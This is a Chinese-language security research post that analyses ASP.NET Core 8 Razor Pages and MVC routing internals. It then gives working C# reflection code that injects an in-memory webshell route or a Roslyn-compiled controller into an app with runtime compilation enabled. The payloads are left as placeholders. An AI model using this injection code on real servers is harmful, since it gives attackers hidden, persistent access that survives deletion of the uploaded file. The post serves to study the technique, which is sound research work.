ASP.NET Core 是 ASP.NET 4.x 的重新设计。 下面列出了两者之间的区别。

[https://learn.microsoft.com/zh-cn/aspnet/core/fundamentals/choose-aspnet-framework](https://learn.microsoft.com/zh-cn/aspnet/core/fundamentals/choose-aspnet-framework)

在.Net Core的Web开发中支持三种开发模式

+ Razor Pages
+ MVC
+ Blazor 

[https://learn.microsoft.com/zh-cn/aspnet/core/tutorials/choose-web-ui](https://learn.microsoft.com/zh-cn/aspnet/core/tutorials/choose-web-ui)

其中Razor Pages是建立在MVC基础之上，是MVC的简化形式，页面的 URL 路径的关联由页面在文件系统中的位置决定。Blazor是组件化、现代、适合前后端共享代码的应用，支持 WebAssembly 或 Server 模式。

这里在.Net Core 8下讨论了MVC和Razor Pages。

## 前提
在.Net Core Web应用中，如果没有开启运行时编译，那么除了静态文件以外都会预编译为dll；在一些CMS中，需要实现模板和主题等功能的时候，可能会开启运行时编译，这种情况下，如果具备可控的文件上传、修改的时候，可以通过修改`.cshtml`文件来GetShell，`.cshtml`文件在Razor Pages中是作为一个单页页面，而在MVC中作为视图文件。

[https://learn.microsoft.com/zh-cn/aspnet/core/mvc/views/razor](https://learn.microsoft.com/zh-cn/aspnet/core/mvc/views/razor)

```xml
<RazorCompileOnBuild>false</RazorCompileOnBuild>
<!-- 禁用构建时预编译 -->
<RazorCompileOnPublish>false</RazorCompileOnPublish>
<!-- 禁用发布时预编译 -->
<CopyRazorGenerateFilesToPublishDirectory>true</CopyRazorGenerateFilesToPublishDirectory>
<!-- 保留 .cshtml 文件 -->
```

ASP.NET Core 核心内置了基本的依赖注入能力，MVC和Razor Pages都依赖此能力。在 ASP.NET Core 中，所有的服务（如数据库上下文、缓存、日志记录器、控制器、页面模型等）都是通过依赖注入来提供。当一个 HTTP 请求到达 ASP.NET Core 应用时，ASP.NET Core 会为该请求创建一个新的 `IServiceProvider`（服务提供者）。这个 `IServiceProvider` 是为该请求提供的服务实例的容器。它会在请求的生命周期内持续有效，并在请求结束后销毁。ASP.NET Core 会在每个请求的 `HttpContext` 对象中设置 `RequestServices`，这个属性是与当前请求相关的 `IServiceProvider` 实例。

ASP.NET Core 的请求处理管道由一系列中间件组件组成。 每个组件在 `HttpContext` 上执行操作，调用管道中的下一个中间件或终止请求。MVC框架则是建立在由 `EndpointRoutingMiddleware` 和 `EndpointMiddleare` 这两个中间件构成的路由系统上。这个路由系统维护着一个 `Endpoinds`，这个 `Endpoinds` 体现为一个路由模式（Route Pattern）与对应处理器（通过 `RequestDelegate` 委托表示）之间的映射。

第一个中间件（`EndpointRoutingMiddleware`）用于去匹配`EndPoint`，第二个中间件（`EndpointMiddleware`）去调用已经匹配到了的 `EndPoint` 的对应处理器。`EndPoint` 这个类（`Microsoft.AspNetCore.Http.Endpoint`）封装了action的信息，比如：Controller类型、Action方法。



## Razor Pages
### 项目结构和启动流程
Razor Pages中一个基本页面开头通过`@page`将文件转换为 MVC 操作，这意味着它可以直接处理请求，而无需经过控制器，一个Page对应的就是一个Action。一个基本的Razor Pages项目结构如下：

+ Pages 文件夹：包含 Razor 页面和支持文件。
+ wwwroot 文件夹：包含静态文件。
+ appsettings.json：包含配置数据。
+ Program.cs

```csharp
var builder = WebApplication.CreateBuilder(args);
// Add services to the container.
builder.Services
    .AddRazorPages()
    .AddRazorRuntimeCompilation(); // 运行时编译支持
var app = builder.Build();
// Configure the HTTP request pipeline.
if (!app.Environment.IsDevelopment())
{
    app.UseExceptionHandler("/Error");
    // The default HSTS value is 30 days. You may want to change this for production scenarios, see https://aka.ms/aspnetcore-hsts.
    app.UseHsts();
}
app.UseHttpsRedirection();
app.UseStaticFiles();
app.UseRouting();
app.UseAuthorization();
app.MapRazorPages();
app.Run();
```

`AddRazorPages()`将页面的服务添加到指定的 `IServiceCollection`（描述服务及其服务类型、实现和生命周期的集合接口：注册到容器）。

`MapRazorPages()`将Razor Pages的终结点添加到 `IEndpointRouteBuilder`，也就是创建`Endpoints`。其最终是返回一个`Microsoft.AspNetCore.Mvc.RazorPages.Infrastructure.PageActionEndpointDataSource`实例。这个实例中订阅变化通知，通过 `ChangeToken.OnChange` 机制监听变动并调用 `UpdateEndpoints` 方法来处理这些变化（路由或 `ActionDescriptor` 集合相关的更新）。

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738466667515-b7877885-abee-4df1-a260-81a123da0ee1.png)

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738466680341-df747c08-4209-4260-8bc4-836bb8dbf2e6.png)

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738493366710-3c957f46-7598-4e86-95a2-4287d51472c9.png)

在获得`IChangeToken`的时候会对`ActionDescriptors` 集合进行初始化（`Microsoft.AspNetCore.Mvc.Infrastructure.DefaultActionDescriptorCollectionProvider.Initialize`），首次初始化会对集合进行更新（`UpdateCollection`），更新过程和MVC中是一样的，通过扫描`IActionDescriptorProvider[]`，这里面主要有两种：

1. `ControllerActionDescriptorProvider`
2. `PageActionDescriptorProvider`

他俩都是实现自`IActionDescriptorProvider`接口，在Razor Pages中，只需要关注`PageActionDescriptorProvider`，在构建`PageRouteModel`的时候，`CompiledPageRouteModelProvider` 负责从已编译的 Razor 页面生成路由模型。它通过获取已编译的页面元数据来构建与这些页面关联的路由。`RazorProjectPageRouteModelProvider` 是用来处理未编译的 Razor 页面。与 `CompiledPageRouteModelProvider` 不同，它直接从 Razor 项目中读取页面和路由模型。读取到的页面和路由模型`PageRouteModel`封装成`ActionDescriptor`并保存到`ActionDescriptorProviderContext`中。

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738468886653-097c13fd-91c4-4961-9d64-6be88def2d55.png)

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738468060785-773a5646-eed4-4dce-bdca-065e665bf9d2.png)



实现了`IPageRouteModelProvider`接口的`RazorProjectPageRouteModelProvider`类中实现是通过扫描目录`/Pages`和`/Areas`下的`.cshtml`文件并创建页面和路由模型。

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738468310791-2a8a93d2-fa5b-49ac-b06a-2ec854e92de2.png)



在创建了`ActionDescriptor`后的Step 3使用 `CancellationChangeToken` 来通知变更事件并取消之前的 `CancellationToken`。而这个新的`CancellationChangeToken`（`_changeToken`）在前面已经配置为了更新路由表`Endpoints`的监控标记，标记的变更会去调用`UpdateEndpoints()`。

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738494046773-2dd3b5c0-fd74-45d8-bbf2-b68e356c6fdd.png)



更新`Endponits`的操作并不是立即发生的，首次调用是在应用启动阶段缓存依赖于路由数据源的路由信息的时候（初始化`DataSourceDependentCache`），`CreateEndpoints`中获取`ActionDescriptors`的时候也会初始化，但是这个时候集合不为空所以不会调用更新集合，这里的调用目标是`Microsoft.AspNetCore.Mvc.RazorPages.Infrastructure.PageActionEndpointDataSource.CreateEndpoints`，通过`ActionEndpointFactory`封装`ActionDescriptors`到一个`Endpoint`集合中，其中Action会被封装为`RequestDelegate`委托。

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738469053244-4bd28616-22bb-4066-be8a-0854be6c65aa.png)

路由表`Endpoints`的创建流程到此为止。

### 请求-路由映射
在 Razor Pages 中，路由映射是通过 Pages 文件夹中的页面和其路径结构自动完成的。每个 Razor 页面对应一个 URL 路径，基于文件名和文件夹结构来决定路由规则，这个过程并不需要显示配置，如果需要页面参数，则需要在对应的页面模型中进行绑定。

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738324803722-b1b36cb4-8d14-457f-8c7b-c8ee9a10722e.png)

一个基本的`.cshtml`文件如下：

```csharp
@page
@model IndexModel
@{
    ViewData["Title"] = "Home page";
}

<div class="text-center">
    <h1 class="display-4">Welcome</h1>
    <p>Learn about <a href="https://learn.microsoft.com/aspnet/core">building Web apps with ASP.NET Core</a>.</p>
</div>
```

前面提到有两个中间件：`EndpointRoutingMiddleware`和`EndpointMiddleware`。

+ `EndpointRoutingMiddleware`为请求匹配一个Endpoint，并放到`HttpContext`中；
+ `EndpointMiddleware`中间件执行Endpoint中的`RequestDelegate`逻辑，即执行Action。

> `EndpointRoutingMiddleware`中间件先是创建`matcher`，然后调用`matcher.MatchAsync(httpContext)`去匹配Endpoint（匹配到的结果自然就放在了HttpContext中），最后通过`httpContext.GetEndpoint()`验证了是否已经匹配到了正确的Endpoint并交给下个中间件继续执行。
>

这里匹配的时候有一个 `DfaMatcher` 类，这个类使用确定性有限自动机 (DFA, Deterministic Finite Automaton) 算法来进行路由的匹配，`DfaMatcher._states`是一个状态数组，它在 DFA 的算法中用于表示路由匹配过程中的所有可能状态。每个状态都表示一个特定的匹配位置，并且在路由匹配时，它会根据传入的请求路径以及已经匹配的部分，更新状态来进行继续匹配，直到找到匹配的 Endpoint 或终止状态。`CreateMatcher`会遍历路由表并封装到`_states`。

在启用运行时编译的Razor Pages的`.cshtml`有点类似于ASP.NET Web Forms架构中的`.aspx`，在匹配请求路由的时候会从`ActionDescriptor`获得相对文件路径，在异步方法`Microsoft.AspNetCore.Mvc.RazorPages.Infrastructure.DefaultPageLoader.LoadAsyncCore`中加载文件并创建异步编译任务，这个任务做了一个缓存机制。

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738480070290-b897e7eb-4324-4bb1-9f21-983c0108a911.png)

当没有缓存的时候调用`Microsoft.AspNetCore.Mvc.Razor.RuntimeCompilation.RuntimeViewCompiler.OnCacheMiss()`

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738481129334-071ca305-a5a2-45af-b017-b6c340b3c884.png)

`OnCacheMiss`里面关注一下`CreateRuntimeCompilationWorkItem`这个调用，目的是为了创建`ViewCompilerWorkItem`

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738481082392-ad5ad2c4-edb6-4ff7-9754-6d17ad06163a.png)

默认的Razor视图引擎中配置了`FileSystem`属性为`PhysicalFileProvider`用来读取`.cshtml`文件数据，会通过相对文件路径创建一个绝对路径的`PhysicalFileInfo`，然后这个`FileInfo`会被封装到`FileProviderRazorProjectItem`来判断是否可以编译。

最终的编译并创建程序集是在`Microsoft.AspNetCore.Mvc.Razor.RuntimeCompilation.RuntimeViewCompiler.CompileAndEmit`中，这里通过Razor文件编译创建了程序集，并将程序集的`RazorCompiledItemAttribute` 特性封装到`CompiledViewDescriptor`中。

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738481551240-d500c255-674d-4b5f-88a4-bbc372df5747.png)

接下来通过`CompiledPageActionDescriptor`工厂类创建`CompiledPageActionDescriptor`，然后创建`Endpoints`，并且创建请求委托。

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738482719349-538a9680-d5c1-4223-a510-00cb1a42583a.png)

---

这个时候会发现好像和启动过程时候创建的`Endpoints`流程重复了，那是因为这里是在**运行时编译环境**下：

应用启动时，主要是为了初始化所有的 Razor 页面的 `Endpoint` 数据源。这是一个预先的准备工作，确保在请求到来之前，应用已经知道所有可用的页面和它们的路由。它将所有的 `Endpoint` 收集到一个数据源中，使得路由能够高效地查找匹配的页面。

而由于这里是运行时编译环境，当请求到达时，`EndpointRoutingMiddleware` 中间件会根据请求的路径来查找与之匹配的 `Endpoint`。如果这个 `Endpoint` 是一个 Razor 页面，它会调用 `LoadAsyncCore` 来加载和编译该页面，并将其绑定到该请求的 `Endpoint` 上。后续请求则直接使用已经编译和缓存的 `Endpoint`。

在**运行时编译**的场景下，虽然在启动时会预先创建 `Endpoint` 数据源（通过 `GetOrCreateDataSource`），但每个 Razor 页面都只有在实际请求时才会被编译。因此，`LoadAsyncCore`在请求发生时编译页面，并生成 `Endpoint`，即使页面已经在路由系统中注册了。

预先创建的数据源并不是在运行时编译下没用，相反在`EndpointRoutingMiddleware`进行匹配的时候创建的`matcherTask`就用到了预先创建的数据源，使请求能够匹配到`ActionDescriptor`来进行编译。

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738487190516-55a4b552-0660-47fe-bd78-81da7efad152.png)

### 内存马实现
> 具体的场景是在运行时编译情况下可以上传一个`.cshtml`文件
>

上面分析了Razor Pages应用启动过程中路由表`Endpoints`的创建流程以及对请求的匹配过程，对于内存马的实现，想要做到的就是往`Endpoints`中添加一条`Endpoint`。一个`Endpoint`是由`ActionDescriptor`封装得到，而`ActionDescriptor`又是由页面和路由模型`PageRouteModel`封装得到的，所以要添加`Endpoint`就先要创建`PageRouteModel`，上面分析`PageRouteModel`创建是在`RazorProjectPageRouteModelProvider.OnProvidersExecuting()`方法中，需要实现`IPageRouteModelProvider`接口（创建`PageRouteModel`的过程可以看`Microsoft.AspNetCore.Mvc.ApplicationModels.PageRouteModelFactory.CreateRouteModel`方法）：

```csharp
public class ShellPageRouteModelProvider : IPageRouteModelProvider
{
    public int Order { get => -1000 + 10; }
    public string _pagePaht;

    public ShellPageRouteModelProvider(string pagePath)
    {
        _pagePaht = pagePath;
    }
    public void OnProvidersExecuting(PageRouteModelProviderContext context)
    {
        var pagePath = _pagePaht;
        var relativePath = "/Shell_";
        var routeModel = new PageRouteModel(relativePath, pagePath);
        routeModel.RouteValues.Add("page", routeModel.ViewEnginePath);
        routeModel.Selectors.Add(new SelectorModel
        {
            AttributeRouteModel = new AttributeRouteModel
            {
                Template = AttributeRouteModel.CombineTemplates(pagePath, null),
            },
            EndpointMetadata =
            {
                new PageRouteMetadata(pagePath, null)
            }
        });
        context.RouteModels.Add(routeModel);
    }
    public void OnProvidersExecuted(PageRouteModelProviderContext context)
    {
    }
}
```

这里指定的`relativePath`是要给不存在的路径，由于运行时编译下使用`PhysicalFileProvider`来获取这个路径上的文件信息，由于文件不存在导致不能正确的编译为程序集，进而导致在`CreateCompiledDescriptor`的时候因为`Type`为`null`造成异常。所以需要实现`IFileProvider`接口来自定义文件查找行为，然后对Razor视图引擎中的`FileSystem`属性进行替换，这样做的时候需要对文件路径进行判断并且还原`FileSystem`。

```csharp
 public class MyFileInfo : IFileInfo
{
    public bool Exists { get => true; }
    public long Length { get;}
    public string? PhysicalPath { get; }
    public string Name { get; set; }
    public DateTimeOffset LastModified { get => DateTimeOffset.Now; }
    public bool IsDirectory { get => false; }
    public static Microsoft.AspNetCore.Razor.Language.RazorProjectFileSystem p;
    public static string s;

    public Stream CreateReadStream()
    {   
        var _fileProvider = p.GetType().GetField("_fileProvider", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(p);
        var _options = _fileProvider.GetType().GetField("_options", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(_fileProvider);
        var _fileProvidersProperty = _options.GetType().GetProperty("FileProviders");
        var _fileProvidersValue = (List<Microsoft.Extensions.FileProviders.IFileProvider>) _fileProvidersProperty.GetValue(_options);
        var originalFileSystem = _fileProvidersValue.FirstOrDefault(i => i.GetType().FullName.Equals("Microsoft.Extensions.FileProviders.PhysicalFileProvider"));
        _fileProvider.GetType().GetField("_compositeFileProvider", BindingFlags.Instance|BindingFlags.NonPublic).SetValue(_fileProvider, originalFileSystem);
        return new MemoryStream(Encoding.ASCII.GetBytes(@"
            Payload
        "));
    }
}

public class TestFileFileProvider : IFileProvider
{
    public static Microsoft.AspNetCore.Razor.Language.RazorProjectFileSystem p;
    public IFileInfo GetFileInfo(string subpath)
    {
        var _fileProvider = p.GetType().GetField("_fileProvider", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(p);
        var _options = _fileProvider.GetType().GetField("_options", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(_fileProvider);
        var _fileProvidersProperty = _options.GetType().GetProperty("FileProviders");
        var _fileProvidersValue = (List<Microsoft.Extensions.FileProviders.IFileProvider>) _fileProvidersProperty.GetValue(_options);
        var originalFileSystem = _fileProvidersValue.FirstOrDefault(i => i.GetType().FullName.Equals("Microsoft.Extensions.FileProviders.PhysicalFileProvider"));
        MyFileInfo.p = p;
        MyFileInfo.s = subpath;
        if (subpath.Contains("Shell_"))
        {
            var f = new MyFileInfo();
            f.Name = subpath;
            return f;
        }
        else
        {
            return  (IFileInfo)  originalFileSystem.GetType().GetMethod("GetFileInfo").Invoke(originalFileSystem, new object[]{ subpath });
        }
    }
    public IDirectoryContents GetDirectoryContents(string subpath) { return null; }
    public IChangeToken Watch(string filter) { return null; }
}
```

### 内存马注入
在Razor页面的上下文中，`HttpContext.RequestServices`是一个`IServiceProvider`实例，表示当前请求的依赖注入容器。可以通过`this.HttpContext.RequestServices.GetService()`访问在 `ConfigureServices` 方法中注册的服务的实例。服务的生命周期由依赖注入容器的配置决定。通过`RequestServices`获取的服务会遵循其在容器中配置的生命周期，常见的生命周期有以下几种：

+ `Transient` (瞬态)：每次请求时都会创建一个新的实例。使用 `GetService<T>()` 获取时，每次都会得到一个新的实例。
+ `Scoped` (作用域)：每个 HTTP 请求（或每个作用域）中，服务只会创建一次并共享。在请求的整个生命周期内，`GetService<T>()` 获取的服务是相同的实例，直到请求结束。
+ `Singleton` (单例)：应用程序的整个生命周期内，服务只有一个实例。无论如何通过 `RequestServices` 获取服务，都会得到同一个实例。

在上面内存马的实现中创建了一个`IPageRouteModelProvider`的实现类，这个类需要添加到`PageActionDescriptorProvider`的`_routeModelProviders`列表中，由于没有直接的接口进行添加所以需要反射修改字段。

```csharp
var pagePath = "/fakepath/" +  Guid.NewGuid().ToString("D");
var iActionDescriptorProviderList = (Microsoft.AspNetCore.Mvc.Abstractions.IActionDescriptorProvider[]) this.HttpContext.RequestServices.GetService(typeof(IEnumerable<>).MakeGenericType(typeof(Microsoft.AspNetCore.Mvc.Abstractions.IActionDescriptorProvider)));
var pageActionDescriptorProvider = iActionDescriptorProviderList.FirstOrDefault(m => m.GetType().FullName.Equals("Microsoft.AspNetCore.Mvc.RazorPages.Infrastructure.PageActionDescriptorProvider"));
var routeModelProvidersField = pageActionDescriptorProvider.GetType().GetField("_routeModelProviders", BindingFlags.Instance | BindingFlags.NonPublic);
var routeModelProviders = (Microsoft.AspNetCore.Mvc.ApplicationModels.IPageRouteModelProvider[]) routeModelProvidersField.GetValue(pageActionDescriptorProvider);
var _list = routeModelProviders.ToList();
_list.Add(new ShellPageRouteModelProvider(pagePath));
routeModelProvidersField.SetValue(pageActionDescriptorProvider, _list.ToArray());
```

接下来需要替换Razor视图引擎中的`FileSystem`

```csharp
var myFileFileProvider = new TestFileFileProvider();
var razorProjectEngine =this.HttpContext.RequestServices.GetService(typeof(Microsoft.AspNetCore.Razor.Language.RazorProjectEngine));
var fileSystem = razorProjectEngine.GetType().GetProperty("FileSystem").GetValue(razorProjectEngine);
var _fileProvider = fileSystem.GetType().GetField("_fileProvider", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(fileSystem);
var _options = _fileProvider.GetType().GetField("_options", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(_fileProvider);
var _fileProvidersProperty = _options.GetType().GetProperty("FileProviders");
var _fileProvidersValue = (List<Microsoft.Extensions.FileProviders.IFileProvider>) _fileProvidersProperty.GetValue(_options);
TestFileFileProvider.p = (Microsoft.AspNetCore.Razor.Language.RazorProjectFileSystem) fileSystem;
_fileProvidersValue.Add(myFileFileProvider);

var selfFileSystem = _fileProvidersValue.LastOrDefault(i => i.GetType().FullName.Contains("TestFileFileProvider"));
_fileProvider.GetType().GetField("_compositeFileProvider", BindingFlags.Instance|BindingFlags.NonPublic).SetValue(_fileProvider, selfFileSystem);
```

现在准备工作都做好了，还有重要的一步。ASP.NET Core的MVC框架中默认情况下对提供的`ActionDescriptor`对象进行了缓存。如果框架能够使用新的`ActionDescriptor`对象，需要告诉它当前应用提供的`ActionDescriptor`列表发生了改变，在启动流程的分析中，已经知道只要去调用`Microsoft.AspNetCore.Mvc.Infrastructure.DefaultActionDescriptorCollectionProvider.UpdateCollection`就会影响到路由表的更新操作，容器中注册了`IActionDescriptorCollectionProvider`的单例服务，可以通过它进行反射调用。

```csharp
// 通知更新前需要保证RazorProjectFileSystem为原来的
var originalFileSystem = _fileProvidersValue.FirstOrDefault(i => i.GetType().FullName.Equals("Microsoft.Extensions.FileProviders.PhysicalFileProvider"));
_fileProvider.GetType().GetField("_compositeFileProvider", BindingFlags.Instance|BindingFlags.NonPublic).SetValue(_fileProvider, originalFileSystem);
this.HttpContext.RequestServices.GetService(typeof(Microsoft.AspNetCore.Mvc.Infrastructure.IActionDescriptorCollectionProvider)).GetType().GetMethod("UpdateCollection", BindingFlags.NonPublic | BindingFlags.Instance).Invoke(this.HttpContext.RequestServices.GetService(typeof(Microsoft.AspNetCore.Mvc.Infrastructure.IActionDescriptorCollectionProvider)), null);
```



效果如下：

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738495282806-9cd48185-ef95-454b-9d9d-159415ceed6a.png)

随后删除`/Pages/FileShell.cshtml`

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738495379079-e58f7035-4df3-4b48-afb0-207291796729.png)

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738495390848-e81ffd0d-9004-4ec5-9f6d-80b334875529.png)

## MVC
### 项目结构和启动流程
ASP.NET Core MVC项目结构如下，视图是在 `.cshtml` 标记中使用 C# 编程语言的 Razor 文件。

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738500129982-92fa3275-8123-42e8-a05b-f5463132359f.png)

```csharp
var builder = WebApplication.CreateBuilder(args);
builder.Services.AddControllersWithViews()
    .AddRazorRuntimeCompilation(); // 运行时编译支持
var app = builder.Build();

// Configure the HTTP request pipeline.
if (!app.Environment.IsDevelopment())
{
    app.UseExceptionHandler("/Home/Error");
    // The default HSTS value is 30 days. You may want to change this for production scenarios, see https://aka.ms/aspnetcore-hsts.
    app.UseHsts();
}

app.UseHttpsRedirection();
app.UseStaticFiles();

app.UseRouting();

app.UseAuthorization();

app.MapControllerRoute(
    name: "default",
    pattern: "{controller=Home}/{action=Index}/{id?}");

app.Run();
```

具体的注册和启动流程和Razor Pages差不多，但是在`Microsoft.AspNetCore.Mvc.Infrastructure.DefaultActionDescriptorCollectionProvider.UpdateCollection`中需要关注的是对`ControllerActionDescriptorProvider`的操作

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738500637923-49b0d633-7fc7-446e-b0a0-7b65acb1ad46.png)



在`ControllerActionDescriptorProvider`中的`GetDescriptors`方法中通过扫描当前已加载程序集（`ApplicationPartManager.ApplicationParts`）中的类型，判断其是否是`Controller`类，对获取到的所有Controller创建`ApplicationModel`，然后封装为`ControllerActionDescriptor`，这个是`ActionDescriptor`的派生类。

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738500977734-90f219ba-0b34-42d0-aa1e-14e9790911a1.png)

判断一个Type是否是Controller

+ 是否是一个类，非接口或结构体；
+ 是否是抽象类，抽象类无法实例化，不能作为Controller；
+ 是否是 `public` 的，控制器类必须是公共的；
+ 是否包含泛型参数，控制器不能是泛型类；
+ 检查类是否标记了`NonControllerAttribute`特性，如果标记了这个特性，则表明该类明确不应被视为控制器；
+ 类名是否以 Controller 结尾（不区分大小写），如果类名没有这个后缀，还会检查类是否有`ControllerAttribute`特性。

创建`ApplicationModel`的时候会根据不同的类型创建：

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738502061784-34fd917f-6df1-4f04-810e-85dd0259ab78.png)

后续路由表`Endpoints`的创建流程和Razor Pages中一样的。

### 请求-路由映射-控制器实列化
在MVC模式下，控制器的依赖注入方式有两种：

+ `builder.Services.AddControllersWithViews();`

这个方法用于将 MVC 控制器和视图注册到依赖注入容器中。它会默认将控制器注册为短暂生命周期（`Transient`），即每次请求都会创建一个新的控制器实例。

+ `builder.Services.AddControllersWithViews().AddControllersAsServices();`

这个方法在 `AddControllersWithViews()` 的基础上额外调用了 `.AddControllersAsServices()`，该方法的作用是将所有控制器注册为服务，从而允许在控制器外部的其他地方使用依赖注入来注入控制器实例。

创建控制器的过程依赖众多不同的提供者和工厂类，但最终是由实现`IControllerActivator`接口的实例来决定的。

与Razor Pages相比除了控制器的实例化不同，其余的流程（路由映射，请求委托）是差不多的。

#### 默认实例化
> 使用的是`DefaultControllerActivator`或`ControllerActivatorProvider`，它通过`TypeActivatorCache`来创建控制器。`TypeActivatorCache`通过调用类的构造函数，并试图从 DI 容器中解析构造函数所需参数的实例。有一点很重要，`DefaultControllerActivator`不会从 DI 容器中解析控制器的实例，只会解析控制器的依赖项。
>

请求进入的时候，匹配到`Endpoint`后在`EndpointMiddleware`中创建`RequestDelegate`；`RequestDelegate`是指向实际处理请求的委托函数，它会在后续的中间件管道中执行。在MVC模式下，`RequestDelegate`通常会指向`ControllerActionInvoker`，该`invoker`会实际调用匹配的 Controller 的 Action 方法。

Controller 实例化是在`ControllerActionInvoker`执行时完成的。`ControllerActionInvoker`会通过`MvcControllerFactory`来实例化 Controller，并通过依赖注入容器解析控制器构造函数中的依赖项。这个实例化过程发生在`RequestDelegate`被执行时，也就是请求开始处理的时候。

这个流程有点长，如果要调试可以在以下地方断点调试：

+ Microsoft.AspNetCore.Mvc.Routing.ControllerRequestDelegateFactory.CreateRequestDelegate
+ Microsoft.AspNetCore.Mvc.Controllers.ControllerFactoryProvider.CreateControllerFactory
+ Microsoft.AspNetCore.Mvc.Controllers.ControllerActivatorProvider.CreateActivator
+ Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvokerCache.GetCachedResult
+ Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.InvokeAsync

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738506371502-2d0a81b5-8353-4a17-8c62-e1a12526fcf4.png)

#### 依赖注入容器实例化
`AddControllersAsServices`是 ASP.NET Core 中的一个扩展方法，用于将 MVC 控制器注册为服务，以便能够通过依赖注入（DI）容器实例化。这意味着可以将控制器的实例化过程转交给 DI 容器，而不仅仅是通过默认的瞬态生命周期（Transient）来创建控制器。

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738505194543-1d93a425-61f8-410f-9899-c696587ed193.png)

替换 .NET Core 中控制器激活器的默认实现为`Microsoft.AspNetCore.Mvc.Controllers.ServiceBasedControllerActivator`

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738506135664-986e0405-6331-42a4-8ed9-cfd449883e61.png)

这个时候不但会从DI容器解析控制器的依赖项，也会解析控制器的实例。

### 内存马实现
根据上面路由表创建的过程，现在需要创建一个程序集并加载到当前应用中，这个程序集中定义Controller类，创建程序集的方法很多，这里使用Roslyn来动态编译源码：

```csharp
public Assembly Compile(string text)
{
    var appDomain = AppDomain.CurrentDomain;
    var assemblies = appDomain.GetAssemblies()
        .Where(a => !a.IsDynamic && !string.IsNullOrEmpty(a.Location))  // 检查路径是否为空
        .Select(a => a.Location)
        .ToList();
    var references =  assemblies
        .Select(location => Microsoft.CodeAnalysis.MetadataReference.CreateFromFile(location, default, null))
        .Cast<MetadataReference>()
        .ToList();
    var options = new CSharpCompilationOptions(OutputKind.DynamicallyLinkedLibrary);
    var assemblyName = "_" + Guid.NewGuid().ToString("D");
    var syntaxTrees = new SyntaxTree[] { CSharpSyntaxTree.ParseText(text) };
    var compilation = CSharpCompilation.Create(assemblyName, syntaxTrees, references, options);
    using var stream = new MemoryStream();
    var compilationResult = compilation.Emit(stream);
    if (compilationResult.Success)
    {
        stream.Seek(0, SeekOrigin.Begin);
        return Assembly.Load(stream.ToArray());
    }
    throw new InvalidOperationException("Compilation error");
}

string action_name = "_" + Guid.NewGuid().ToString("D").Replace("-", "");
string controller_name = "_" + Guid.NewGuid().ToString("D").Replace("-", "");
string sourceCode = @"
    public class %controller_name%Controller
    {
    
        public string %action_name%()
        {
            return ""ok"";
        }
    
    }
".Replace("%action_name%", action_name).Replace("%controller_name%", controller_name);

var assemblyShell = Compile(sourceCode);
```

### 内存马注入
#### 默认实例化
默认情况下，只需要将创建好的程序集添加到`ApplicationPartManager.ApplicationParts`中，并且通知MVC框架进行更新。

```csharp
var iActionDescriptorProviderList = (Microsoft.AspNetCore.Mvc.Abstractions.IActionDescriptorProvider[])this.Context.RequestServices.GetService(typeof(IEnumerable<>).MakeGenericType(typeof(Microsoft.AspNetCore.Mvc.Abstractions.IActionDescriptorProvider)));
var actionDescriptorProvider = iActionDescriptorProviderList.FirstOrDefault(m => m.GetType().FullName.Equals("Microsoft.AspNetCore.Mvc.ApplicationModels.ControllerActionDescriptorProvider"));
var partManager = actionDescriptorProvider.GetType().GetField("_partManager", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(actionDescriptorProvider);
var applicationParts = (List<Microsoft.AspNetCore.Mvc.ApplicationParts.ApplicationPart>)partManager.GetType().GetProperty("ApplicationParts").GetValue(partManager);
var assemblyPartType = typeof(Microsoft.AspNetCore.Mvc.ApplicationParts.AssemblyPart);
var assemblyPart = (Microsoft.AspNetCore.Mvc.ApplicationParts.AssemblyPart) Activator.CreateInstance(assemblyPartType, assemblyShell);
applicationParts.Add(assemblyPart); // 添加到ApplicationParts

this.Context.RequestServices.GetService(typeof(Microsoft.AspNetCore.Mvc.Infrastructure.IActionDescriptorCollectionProvider)).GetType().GetMethod("UpdateCollection", BindingFlags.NonPublic | BindingFlags.Instance).Invoke(this.Context.RequestServices.GetService(typeof(Microsoft.AspNetCore.Mvc.Infrastructure.IActionDescriptorCollectionProvider)), null);
```



#### 依赖注入容器实例化
上面默认情况下的注入在这种情况下注入后会导致创建控制器实例的时候，从依赖注入容器中获取服务实例时会为null导致后续流程异常。

所以先来看看`Microsoft.AspNetCore.Mvc.Controllers.ServiceBasedControllerActivator`的实现

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738572748563-01b15f96-0766-4cac-96fb-fb69bbfa395b.png)

`actionContext.HttpContext.RequestServices`是一个`Microsoft.Extensions.DependencyInjection.ServiceLookup.ServiceProviderEngineScope`实例，最终调用到了`Microsoft.Extensions.DependencyInjection.ServiceProvider.GetService`

